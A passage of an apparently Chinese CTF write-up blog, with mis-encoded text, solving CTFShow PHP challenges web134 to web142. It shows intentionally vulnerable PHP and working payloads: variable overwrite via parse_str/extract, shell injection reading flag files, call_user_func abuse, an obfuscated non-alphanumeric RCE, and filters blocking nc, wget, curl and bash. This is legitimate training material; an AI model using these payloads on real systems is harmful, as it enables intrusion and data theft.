<li><p>é¦–å…ˆé˜…è¯»ç¨‹åºä¸Šä¸‹æ–‡ï¼Œå®šä¹‰äº†ä¸¤ä¸ªå˜é‡ï¼Œç¬¬ä¸€ä¸ªif()åˆ¤æ–­å¯¹GET å’Œ POST çš„å‚æ•°è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœæœ‰åˆ™ç‹—å¸¦äº†ã€‚</p>
</li>
<li><p>parse_str() åˆå‡ºç°äº†ï¼š å°†å­—ç¬¦ä¸²è§£ææˆå¤šä¸ªå˜é‡ï¼Œæ²¡æœ‰è¿”å›å€¼ï¼›</p>
</li>
<li><p>$_SERVER[â€˜QUERY_STRINGâ€™] åˆå‡ºç°äº†ï¼š æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œåœ¨æœ¬é¢˜ä¸­å°†ï¼Œå°†å¾—åˆ°å­—ç¬¦ä¸²ç„¶åä½œä¸º parse_str()çš„å‚æ•°æ‰§è¡Œã€‚é‚£ä¹ˆå­—ç¬¦ä¸²çš„å†…å®¹å°±ä¼šå˜ä¸ºå¤šä¸ªå˜é‡ã€‚ä¸¾ä¸ªä¾‹å­: _POST[a]=1&amp;_POST[b]=2; å°† _POST[a] å’Œ _POST[b] ä¸ºäº†å˜é‡, $ _POST[a] å’Œ $ _POSTarr[b];</p>
</li>
<li><p>extract()åˆå‡ºç°äº†ï¼šä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ï¼Œæ£€æŸ¥æ¯ä¸ªé”®åçœ‹æ˜¯å¦å¯ä»¥ä½œä¸ºä¸€ä¸ªåˆæ³•çš„å˜é‡åï¼ŒåŒæ—¶ä¹Ÿæ£€æŸ¥å’Œç¬¦å·è¡¨ä¸­å·²æœ‰çš„å˜é‡åçš„å†²çªã€‚ ä¸¾ä¸ªä¾‹å­ï¼š_ POST[a]=1,_POST[b]=2; å°†é”®å a å’Œ b ä½œä¸ºäº†å˜é‡ï¼Œæ‰€ä»¥ $a=1,$b=2;</p>
</li>
<li><p>æœ€åä¸€ä¸ª if() åˆ¤æ–­ï¼Œä½¿ $key1 å’Œ $key2 ç­‰äº 36d æ‰èƒ½å¾—åˆ°æœ€åçš„ flagã€‚é‚£ä¹ˆåœ¨ä¸Šä¸€æ­¥ extract() å˜é‡è¦†ç›–ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å°† key1 å’Œ key2 ä½œä¸ºæŸä¸ªæ•°ç»„çš„ é”®åï¼Œ å†å¾€ä¸Šä¸€æ­¥ parse_str() å­—ç¬¦ä¸²è§£æä¸ºå˜é‡ï¼Œä¼ å…¥çš„å­—ç¬¦ä¸²å¾—åŒ…å« key1 å’Œ key2ã€‚å¦‚æœç›´æ¥å°† key1 å’Œ key2ä½œä¸ºå˜é‡åï¼Œå°±ä¸èƒ½è¢«extract()è¦†ç›–ä½œä¸ºæ•°ç»„çš„ é”®åã€‚å› æ­¤ä¼ å…¥çš„å­—ç¬¦ä¸²å¿…é¡»æ˜¯ä¸ªæ•°ç»„ä¸”é”®åå¾—æ˜¯ key1 å’Œ key2ã€‚</p>
</li>
<li><p>æœ¬åœ°éªŒè¯:</p>
</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web134.png"></p>
<ul>
<li>æœ€ç»ˆç»“æœ: ?_POST[key1]=36d&amp;_POST[key2]=36d</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web134_1.png"></p>
<h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-16 18:48:03</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¸ˆå‚…ä»¬å±…ç„¶ç ´è§£äº†å‰é¢çš„ï¼Œé‚£å°±æ¥ä¸€ä¸ªåŠ å¼ºç‰ˆå§&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>è¿™é¢˜å’Œ web 133ç±»ä¼¼ï¼Œå¤šäº†è¿‡æ»¤çš„å†…å®¹ï¼Œçœ‹äº†çœ‹ç½‘ä¸Šå¤§ä½¬çš„æ–‡ç« :</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?F=`<span class="variable">$F</span> `; cp flag.php <span class="number">1</span>.txt;</span><br></pre></td></tr></table></figure>

<ul>
<li>æ‰§è¡Œåè®¿é—® 1.txt </li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web135.png"></p>
<h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    check(<span class="variable">$c</span>);</span><br><span class="line">    exec(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>è¿˜æ˜¯å’Œä¸Šä¸€é¢˜ç±»ä¼¼ï¼Œå‚è€ƒç¾½å¸ˆå‚…çš„æ–‡ç« ,ç”¨åˆ° tee å‘½ä»¤:ç”¨äºè¯»å–æ ‡å‡†è¾“å…¥çš„æ•°æ®ï¼Œå¹¶å°†å…¶å†…å®¹è¾“å‡ºæˆæ–‡ä»¶ã€‚teeæŒ‡ä»¤ä¼šä»æ ‡å‡†è¾“å…¥è®¾å¤‡è¯»å–æ•°æ®ï¼Œå°†å…¶å†…å®¹è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ï¼ŒåŒæ—¶ä¿å­˜æˆæ–‡ä»¶ã€‚è¯¦æƒ…ç™¾åº¦</li>
<li>?c=ls|tee 1 å°† ls å‡ºæ¥çš„å†…å®¹ é€šè¿‡ tee å­˜å…¥ æ–‡ä»¶ 1 ä¸­ï¼Œç„¶åè®¿é—®  url/1 å°†ä¸‹è½½æ­¤æ–‡ä»¶æ‰“å¼€å‘ç°:å½“å‰ç›®å½•æ²¡æœ‰flag.phpæ–‡ä»¶</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web136.png"></p>
<ul>
<li>?c=ls / |tee 1 å°† ls / æ ¹ç›®å½•ä¸­çš„å†…å®¹é€šè¿‡ tee å†™å…¥åˆ° 1 ä¸­ï¼Œå†æ¬¡æ‰“å¼€: å‘ç°æ ¹ç›®å½•ä¸‹æœ‰ : f149_15_h3r3</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web136_1.png"></p>
<ul>
<li>?c=cat /f149_15_h3r3 |tee flag æ‰“å¼€å¾—åˆ° flag</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web136_2.png"></p>
<h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-16 22:27:49</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>call_user_func() åœ¨ web128ä¸­ä½¿ç”¨è¿‡ä¸€æ¬¡ã€‚æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨</li>
<li>ä»£ç ä¸­ å®šä¹‰äº† ä¸€ä¸ª ctfshow ç±»ï¼Œç±»ä¸­æœ‰ å‡½æ•° getFlag() </li>
<li>æˆ‘ä»¬éœ€è¦é€šè¿‡ call_user_func() æ¥è°ƒç”¨è¿™ä¸ªç±»ä¸­çš„å‡½æ•°ã€‚</li>
<li>åœ¨ ç±» ä¸­ å¯ä»¥ä½¿ç”¨ :: ä¸¤ä¸ªå†’å·æ¥è°ƒç”¨ç±»ä¸­çš„å‡½æ•°å’Œå±æ€§ã€‚</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web137.png"></p>
<h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-16 22:52:13</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strripos(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šå¯¹ :ï¼ˆå†’å·ï¼‰ è¿›è¡Œäº†åŒ¹é…ï¼Œä¸ç®¡æ€ä¹ˆè¾“å…¥ :ï¼ˆå†’å·ï¼‰ï¼Œ strripos() åŒ¹é…çš„ç»“æœéƒ½æ˜¯ æ­£æ•°ã€‚å› æ­¤å¾—æ¢ä¸€ä¸ªæ–¹æ³•æ¥è°ƒç”¨ç±»ä¸­çš„å†…å®¹ã€‚</li>
<li>call_user_func() çš„æ‰‹å†Œä¸­æœ‰å¯¹ å¦‚ä½•è°ƒå– ç±» è¿›è¡Œäº†è®²è§£å¦‚ä¸‹å›¾ï¼š</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web138.png"></p>
<ul>
<li>å‘ç°å¯ä»¥ä½¿ç”¨æ•°ç»„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸º ç±»åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸º ç±»ä¸­çš„å‡½æ•°å(æ–¹æ³•å)</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// post:</span></span><br><span class="line">ctfshow[<span class="number">0</span>]=ctfshow&amp;ctfshow[<span class="number">1</span>]=getFlag</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web138_1.png"></p>
<h2 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h2><p>å…ˆæ”¾ç€</p>
<h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-17 12:39:25</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f1</span> = (<span class="keyword">String</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    <span class="variable">$f2</span> = (<span class="keyword">String</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(intval(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>é¦–å…ˆé˜…è¯»ç¨‹åºä¸Šä¸‹æ–‡ POST ä¸¤ä¸ªå‚æ•°å¿…é¡»æ•°å­—æˆ–å­—æ¯ç»„æˆï¼Œä¸”  $f1($f2()); æ³¨æ„æ‹¬å· å˜é‡åé¢æœ‰æ‹¬å·è¡¨ç¤ºå‡½æ•°äº†ã€‚éšä¾¿è¾“å…¥å‡ ä¸ªå‡½æ•°</li>
<li>intval() å¦‚æœå‚æ•°ä¸º å­—æ¯ç»„æˆï¼Œå®ƒçš„è¿”å›å€¼ä¸º 0 ã€‚ </li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// post:</span></span><br><span class="line">f1=md5&amp;f2=md5</span><br><span class="line">f1=usleep&amp;f2=usleep</span><br><span class="line">â€¦â€¦</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web140.png"></p>
<h2 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-17 19:28:09</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>é¦–å…ˆé˜…è¯»ç¨‹åºä¸Šä¸‹æ–‡ï¼Œå‘ç°äº† æ­£åˆ™åŒ¹é…ï¼š /^\W+$/     \W åŒ¹é…<strong>éå­—æ¯ï¼Œæ•°å­—ï¼Œä¸‹åˆ’çº¿</strong>ç­‰ä»·äº â€˜[A-Za-z0-9_]â€™ ï¼Œæ³¨æ„ â€œéâ€ è¿™ä¸ªå­—ï¼Œå°±æ˜¯ä¸åŒ¹é… å­—æ¯ï¼Œæ•°å­—ï¼Œä¸‹åˆ’çº¿ã€‚</li>
<li>is_numericï¼ˆï¼‰ æ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸² ã€‚é‚£ä¹ˆ v1 ï¼Œ v2 å¾—æ˜¯æ•°å­—å½¢å¼ã€‚</li>
<li>éœ€è¦æ„é€ ç»•è¿‡ å­—æ¯ï¼Œæ•°å­—ï¼Œä¸‹åˆ’çº¿çš„ å­—ç¬¦ã€‚å‚è€ƒäº† ç¾½å¸ˆå‚…çš„æ–‡ç« ã€‚</li>
<li>eval(â€œreturn $v1$v3$v2â€), return è¿”å›å¹¶ç»“æŸç¨‹åºï¼Œè€Œ v1, v2 ä¸ºæ•°å­—ï¼Œé‚£ä¹ˆ v3 å°±æ˜¯å‘½ä»¤æ‰§è¡Œäº†ã€‚æ‰€ä»¥è¦è®© v3 = æ— å­—æ¯æ•°å­—ä¸‹åˆ’çº¿çš„ RCEã€‚éœ€è¦æ³¨æ„ v1, v2,v3çš„ä½ç½®ã€‚æ¥æœ¬åœ°æµ‹è¯•ä¸€ä¸‹ã€‚</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web141.png"></p>
<ul>
<li>æ³¨æ„å›¾ä¸­ ï¼Œåˆ†åˆ«ä¸º v1,v2,v3 ä¼ å…¥å‚æ•°: 1,2,3 é‚£ä¹ˆ $v1$v3$v2=123 ï¼Œ æ²¡æœ‰ç»“æœï¼Œå†çœ‹ä¸€ä¸ªç¤ºä¾‹:</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web141_1.png"></p>
<ul>
<li>å¦‚å›¾æ‰€ç¤ºï¼Œå°† v3 æ›´æ”¹ä¸ºäº† - (å‡å·) å¯å¾—åˆ°ç»“æœã€‚ç±»æ¨ï¼š *ï¼Œ / ï¼Œ% ï¼Œ^ ç­‰éƒ½è¡Œï¼Œä½†æ˜¯ + ä¸è¡Œã€‚ æ­¤æ—¶å¯ä»¥è¯æ˜ PHP ä¸­ æ•°å­—å¯ä»¥å’Œå‘½ä»¤è¿›è¡Œè¿ç®—ã€‚å†çœ‹ä¸€ä¸ªç¤ºä¾‹ï¼š</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web141_2.png"></p>
<ul>
<li>å¦‚å›¾æ‰€ç¤ºï¼Œå°† phpinfo() ä¸ æ•°å­—è¿›è¡Œäº†è¿ç®— ï¼š 1-phpinfo()*2 , ä»ç„¶èƒ½å¾—åˆ° php çš„ç‰ˆä¿¡æ¯ã€‚å†çœ‹ä¸€ä¸ªç¤ºä¾‹: </li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web141_3.png"></p>
<ul>
<li>å¦‚å›¾æ‰€ç¤º: åœ¨ä¸Šä¸€æ­¥ä¸Šä¾æ­¤ç±»æ¨å¯ä»¥æ„é€ å‡º system(â€œtac f*â€); è€Œåœ¨æœ¬é¢˜å½“ä¸­ éœ€è¦ å°† system(â€œtac f*â€) æ­¤å‘½ä»¤å˜æˆ æ— å­—æ¯æ•°å­—çš„ RCEï¼š (<del>%8C%86%8C%8B%9A%92)(</del>%8B%9E%9C%DF%99%D5)</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="number">2</span>&amp;v3=-(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">8</span>B%<span class="number">9</span>E%<span class="number">9</span>C%DF%<span class="number">99</span>%D5)*</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web141_4.png"></p>
<ul>
<li>å¾—åˆ° äº† flag , è¿™é¢˜çš„ é‡ç‚¹ åœ¨äº æ— å­—æ¯æ•°å­—å­—ç¬¦çš„æ„é€ ã€‚</li>
</ul>
<h2 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-17 19:36:02</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>))&#123;</span><br><span class="line">        <span class="variable">$d</span> = (<span class="keyword">int</span>)(<span class="variable">$v1</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span>);</span><br><span class="line">        sleep(<span class="variable">$d</span>);</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>GET ä¸€ä¸ªå‚æ•° v1, å¹¶ å¼ºåˆ¶ç±»å‹è½¬æ¢ä¸º Stringç±»å‹ã€‚</li>
<li>is_numeric() å‡½æ•°å°†æ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ã€‚é‚£ä¹ˆæ­¤å¤„çš„ v1 ä¸º String ç¬¦åˆæ­¤å‡½æ•°ã€‚</li>
<li>$d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d); è¡¨ç¤º å°† v1ä¸0x3dç›¸ä¹˜å–æ•´èµ‹å€¼ç»™ $d.</li>
<li>sleep($d);å°† ä¼‘çœ å¾—åˆ°çš„ç§’æ•°ã€‚å› æ­¤å°† v1=0 ,0ä¹˜ä»»ä½•ä¹¦å¾—0å°†ä¼šä¼‘çœ 0ç§’ã€‚å³å¯è¾“å‡ºflagã€‚</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web142.png"></p>
